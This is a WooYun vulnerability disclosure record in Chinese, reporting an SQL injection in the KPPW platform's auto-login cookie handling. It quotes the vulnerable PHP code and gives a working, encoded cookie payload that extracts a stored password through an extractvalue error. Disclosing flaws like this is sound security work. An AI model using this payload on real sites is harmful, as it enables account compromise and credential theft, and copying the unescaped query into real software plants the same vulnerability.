{"id": 83274, "wybug_id": "wooyun-2015-0148386", "wybug_title": "kppw最新版注入一枚。", "wybug_corp": "keke.com", "wybug_author": "路人甲", "wybug_date": "2015-10-22 11:38", "wybug_open_date": "2016-01-25 11:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向公众公开  简要描述： SQL。 详细说明：  http://**.**.**.**/bugs/wooyun-2015-0131525上次的任意用户登录已经标明了是注入漏洞了，然后只加了个token把任意用户登录补上了。\\lib\\inc\\keke_core_class.php  1002行\n} elseif ($_COOKIE ['keke_auto_login']) {\t\t    $token = $_COOKIE ['keke_auto_login'];\t\t\t$loginInfo = unserialize ( $_COOKIE ['keke_auto_login'] );\t\t\t$pwdInfo = explode ( '|', base64_decode ( $loginInfo [2] ) );\t\t\t$uInfo = kekezu::get_table_data ( '*', 'witkey_space', \" username='$pwdInfo[2]' and token = '$token'\", '', '' );\t\t\tif ($uInfo [0] ['uid'] == $pwdInfo [0]) {\t\t\t\t$_SESSION ['uid'] = $uInfo [0] ['uid'];\t\t\t\t$_SESSION ['username'] = $uInfo [0] ['username'];\t\t\t\t$this->_uid = $_SESSION ['uid'];\t\t\t\t$this->_username = $uInfo [0] ['username'];\t\t\t}\t\t}\t}\n注入依旧。payload:keke_auto_login=a%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22MTE%3D%22%3Bi%3A1%3Bs%3A8%3A%22cXdlcnR5%22%3Bi%3A2%3Bs%3A228%3A%22MTF8TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4yOyBXT1c2NDsgcnY6NDEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MS4wfHF3ZXJ0eScgYW5kIGV4dHJhY3R2YWx1ZSgxLCBjb25jYXQoMHg1Yywoc2VsZWN0IHBhc3N3b3JkIGZyb20ga2VrZV93aXRrZXlfbWVtYmVyIGxpbWl0IDEpKSk7Iw%3D%3D%22%3B%7D;\n\n   漏洞证明：  如上。   修复方案：  过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-25 11:50 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}